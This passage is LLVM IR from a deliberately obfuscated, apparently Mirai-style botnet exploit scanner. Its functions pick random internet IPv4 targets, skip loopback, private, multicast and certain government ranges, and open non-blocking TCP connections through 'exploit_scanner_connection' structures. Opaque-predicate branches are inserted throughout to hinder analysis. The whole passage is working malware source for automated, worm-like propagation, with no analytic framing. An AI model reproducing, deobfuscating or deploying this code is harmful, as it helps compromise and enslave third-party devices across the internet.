  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %1373)
  br label %originalBB243

originalBB247alteredBB:                           ; preds = %originalBB247, %1127
  %1374 = load i32, i32* %32, align 4
  %1375 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1376 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1375, i32 0, i32 5
  %1377 = load i32, i32* %1376, align 4
  %_248 = sub i32 0, %1377
  %gen249 = add i32 %_248, %1374
  %_250 = sub i32 %1377, %1374
  %gen251 = mul i32 %_250, %1374
  %1378 = add nsw i32 %1377, %1374
  store i32 %1378, i32* %1376, align 4
  %1379 = load i32, i32* @exploit_fake_time, align 4
  %1380 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1381 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1380, i32 0, i32 1
  store i32 %1379, i32* %1381, align 4
  %1382 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1383 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1382, i32 0, i32 6
  %1384 = getelementptr inbounds [256 x i8], [256 x i8]* %1383, i32 0, i32 0
  %1385 = call i32 @util_strlen(i8* %1384)
  store i32 %1385, i32* %33, align 4
  %1386 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1387 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1386, i32 0, i32 6
  %1388 = load i32, i32* %33, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds [256 x i8], [256 x i8]* %1387, i64 0, i64 %1389
  store i8 0, i8* %1390, align 1
  br label %originalBB247

originalBB255alteredBB:                           ; preds = %originalBB255, %1162
  br label %originalBB255

originalBB259alteredBB:                           ; preds = %originalBB259, %1182
  br label %originalBB259
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  store i8 0, i8* %2, align 1
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  br label %6

; <label>:6:                                      ; preds = %originalBBpart240, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = call i64 @time(i64* null) #6
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #6
  %10 = load i32, i32* %1, align 4
  %11 = and i32 %10, 255
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* %2, align 1
  %13 = load i32, i32* %1, align 4
  %14 = lshr i32 %13, 8
  %15 = and i32 %14, 255
  %16 = trunc i32 %15 to i8
  store i8 %16, i8* %3, align 1
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 16
  %19 = and i32 %18, 255
  %20 = trunc i32 %19 to i8
  store i8 %20, i8* %4, align 1
  %21 = load i32, i32* %1, align 4
  %22 = lshr i32 %21, 24
  %23 = and i32 %22, 255
  %24 = trunc i32 %23 to i8
  store i8 %24, i8* %5, align 1
  br label %25

; <label>:25:                                     ; preds = %6
  %26 = load i8, i8* %2, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 127
  br i1 %28, label %323, label %29

; <label>:29:                                     ; preds = %25
  %30 = load i8, i8* %2, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %323, label %33

; <label>:33:                                     ; preds = %29
  %34 = load i8, i8* %2, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 3
  br i1 %36, label %323, label %37

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.51
  %39 = load i32, i32* @y.52
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i8, i8* %2, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 15
  %49 = load i32, i32* @x.51
  %50 = load i32, i32* @y.52
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %48, label %323, label %57

; <label>:57:                                     ; preds = %originalBBpart2
  %58 = load i8, i8* %2, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 16
  br i1 %60, label %323, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %2, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 56
  br i1 %64, label %323, label %65

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.51
  %67 = load i32, i32* @y.52
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i8, i8* %2, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 10
  %77 = load i32, i32* @x.51
  %78 = load i32, i32* @y.52
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %76, label %323, label %85

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* @x.51
  %87 = load i32, i32* @y.52
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i8, i8* %2, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 192
  %97 = load i32, i32* @x.51
  %98 = load i32, i32* @y.52
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %96, label %105, label %109

; <label>:105:                                    ; preds = %originalBBpart28
  %106 = load i8, i8* %3, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 168
  br i1 %108, label %323, label %109

; <label>:109:                                    ; preds = %105, %originalBBpart28
  %110 = load i8, i8* %2, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 172
  br i1 %112, label %113, label %121

; <label>:113:                                    ; preds = %109
  %114 = load i8, i8* %3, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp sge i32 %115, 16
  br i1 %116, label %117, label %121

; <label>:117:                                    ; preds = %113
  %118 = load i8, i8* %3, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %119, 32
  br i1 %120, label %323, label %121

; <label>:121:                                    ; preds = %117, %113, %109
  %122 = load i8, i8* %2, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 100
  br i1 %124, label %125, label %149

; <label>:125:                                    ; preds = %121
  %126 = load i8, i8* %3, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp sge i32 %127, 64
  br i1 %128, label %129, label %149

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* @x.51
  %131 = load i32, i32* @y.52
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %129
  %138 = load i8, i8* %3, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp slt i32 %139, 127
  %141 = load i32, i32* @x.51
  %142 = load i32, i32* @y.52
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %140, label %323, label %149

; <label>:149:                                    ; preds = %originalBBpart212, %125, %121
  %150 = load i8, i8* %2, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 169
  br i1 %152, label %153, label %173

; <label>:153:                                    ; preds = %149
  %154 = load i32, i32* @x.51
  %155 = load i32, i32* @y.52
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %153
  %162 = load i8, i8* %3, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp sgt i32 %163, 254
  %165 = load i32, i32* @x.51
  %166 = load i32, i32* @y.52
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %164, label %323, label %173

; <label>:173:                                    ; preds = %originalBBpart216, %149
  %174 = load i8, i8* %2, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 198
  br i1 %176, label %177, label %185

; <label>:177:                                    ; preds = %173
  %178 = load i8, i8* %3, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp sge i32 %179, 18
  br i1 %180, label %181, label %185

; <label>:181:                                    ; preds = %177
  %182 = load i8, i8* %3, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp slt i32 %183, 20
  br i1 %184, label %323, label %185

; <label>:185:                                    ; preds = %181, %177, %173
  %186 = load i8, i8* %2, align 1
  %187 = zext i8 %186 to i32
  %188 = icmp sge i32 %187, 224
  br i1 %188, label %323, label %189

; <label>:189:                                    ; preds = %185
  %190 = load i8, i8* %2, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 6
  br i1 %192, label %321, label %193

; <label>:193:                                    ; preds = %189
  %194 = load i32, i32* @x.51
  %195 = load i32, i32* @y.52
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %193
  %202 = load i8, i8* %2, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 7
  %205 = load i32, i32* @x.51
  %206 = load i32, i32* @y.52
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %204, label %321, label %213

; <label>:213:                                    ; preds = %originalBBpart220
  %214 = load i32, i32* @x.51
  %215 = load i32, i32* @y.52
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %213
  %222 = load i8, i8* %2, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 11
  %225 = load i32, i32* @x.51
  %226 = load i32, i32* @y.52
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %224, label %321, label %233

; <label>:233:                                    ; preds = %originalBBpart224
  %234 = load i8, i8* %2, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 21
  br i1 %236, label %321, label %237

; <label>:237:                                    ; preds = %233
  %238 = load i8, i8* %2, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 22
  br i1 %240, label %321, label %241

; <label>:241:                                    ; preds = %237
  %242 = load i8, i8* %2, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 26
  br i1 %244, label %321, label %245

; <label>:245:                                    ; preds = %241
  %246 = load i8, i8* %2, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 28
  br i1 %248, label %321, label %249

; <label>:249:                                    ; preds = %245
  %250 = load i32, i32* @x.51
  %251 = load i32, i32* @y.52
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load i8, i8* %2, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp eq i32 %259, 29
  %261 = load i32, i32* @x.51
  %262 = load i32, i32* @y.52
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %260, label %321, label %269

; <label>:269:                                    ; preds = %originalBBpart228
  %270 = load i32, i32* @x.51
  %271 = load i32, i32* @y.52
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %269
  %278 = load i8, i8* %2, align 1
  %279 = zext i8 %278 to i32
  %280 = icmp eq i32 %279, 30
  %281 = load i32, i32* @x.51
  %282 = load i32, i32* @y.52
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %280, label %321, label %289

; <label>:289:                                    ; preds = %originalBBpart232
  %290 = load i32, i32* @x.51
  %291 = load i32, i32* @y.52
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %289
  %298 = load i8, i8* %2, align 1
  %299 = zext i8 %298 to i32
  %300 = icmp eq i32 %299, 33
  %301 = load i32, i32* @x.51
  %302 = load i32, i32* @y.52
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %300, label %321, label %309

; <label>:309:                                    ; preds = %originalBBpart236
  %310 = load i8, i8* %2, align 1
  %311 = zext i8 %310 to i32
  %312 = icmp eq i32 %311, 55
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %309
  %314 = load i8, i8* %2, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp eq i32 %315, 214
  br i1 %316, label %321, label %317

; <label>:317:                                    ; preds = %313
  %318 = load i8, i8* %2, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp eq i32 %319, 215
  br label %321

; <label>:321:                                    ; preds = %317, %313, %309, %originalBBpart236, %originalBBpart232, %originalBBpart228, %245, %241, %237, %233, %originalBBpart224, %originalBBpart220, %189
  %322 = phi i1 [ true, %313 ], [ true, %309 ], [ true, %originalBBpart236 ], [ true, %originalBBpart232 ], [ true, %originalBBpart228 ], [ true, %245 ], [ true, %241 ], [ true, %237 ], [ true, %233 ], [ true, %originalBBpart224 ], [ true, %originalBBpart220 ], [ true, %189 ], [ %320, %317 ]
  br label %323

; <label>:323:                                    ; preds = %321, %185, %181, %originalBBpart216, %originalBBpart212, %117, %105, %originalBBpart24, %61, %57, %originalBBpart2, %33, %29, %25
  %324 = phi i1 [ true, %185 ], [ true, %181 ], [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ true, %117 ], [ true, %105 ], [ true, %originalBBpart24 ], [ true, %61 ], [ true, %57 ], [ true, %originalBBpart2 ], [ true, %33 ], [ true, %29 ], [ true, %25 ], [ %322, %321 ]
  %325 = load i32, i32* @x.51
  %326 = load i32, i32* @y.52
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %323
  %333 = load i32, i32* @x.51
  %334 = load i32, i32* @y.52
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %324, label %6, label %341

; <label>:341:                                    ; preds = %originalBBpart240
  %342 = load i8, i8* %2, align 1
  %343 = zext i8 %342 to i32
  %344 = shl i32 %343, 24
  %345 = load i8, i8* %3, align 1
  %346 = zext i8 %345 to i32
  %347 = shl i32 %346, 16
  %348 = or i32 %344, %347
  %349 = load i8, i8* %4, align 1
  %350 = zext i8 %349 to i32
  %351 = shl i32 %350, 8
  %352 = or i32 %348, %351
  %353 = load i8, i8* %5, align 1
  %354 = zext i8 %353 to i32
  %355 = shl i32 %354, 0
  %356 = or i32 %352, %355
  %357 = call i32 @htonl(i32 %356) #9
  ret i32 %357

originalBBalteredBB:                              ; preds = %originalBB, %37
  %358 = load i8, i8* %2, align 1
  %359 = zext i8 %358 to i32
  %360 = icmp eq i32 %359, 15
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %361 = load i8, i8* %2, align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %364 = load i8, i8* %2, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 192
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %129
  %367 = load i8, i8* %3, align 1
  %368 = zext i8 %367 to i32
  %369 = icmp slt i32 %368, 127
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %153
  %370 = load i8, i8* %3, align 1
  %371 = zext i8 %370 to i32
  %372 = icmp sgt i32 %371, 254
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %193
  %373 = load i8, i8* %2, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 7
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %213
  %376 = load i8, i8* %2, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 11
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  %379 = load i8, i8* %2, align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 29
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %269
  %382 = load i8, i8* %2, align 1
  %383 = zext i8 %382 to i32
  %384 = icmp eq i32 %383, 30
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %289
  %385 = load i8, i8* %2, align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 33
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %323
  br label %originalBB38
}

declare zeroext i16 @checksum_generic(i16*, i32) #5

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: noinline nounwind uwtable
define internal void @exploit_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %103

; <label>:21:                                     ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @exploit_fake_time, align 4
  %47 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

; <label>:53:                                     ; preds = %21
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %53, %21
  %59 = load i32, i32* @x.53
  %60 = load i32, i32* @y.54
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* @x.53
  %68 = load i32, i32* @y.54
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %78

; <label>:75:                                     ; preds = %53
  %76 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %76, i32 0, i32 2
  store i32 1, i32* %77, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %originalBBpart2
  %79 = load i32, i32* @x.53
  %80 = load i32, i32* @y.54
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %88 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %91 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %91, %struct.sockaddr** %90, align 8
  %92 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %93 = load %struct.sockaddr*, %struct.sockaddr** %92, align 8
  %94 = call i32 @connect(i32 %89, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* @x.53
  %96 = load i32, i32* @y.54
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %103

; <label>:103:                                    ; preds = %originalBBpart24, %20
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %104 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %105 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %108 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %108, %struct.sockaddr** %107, align 8
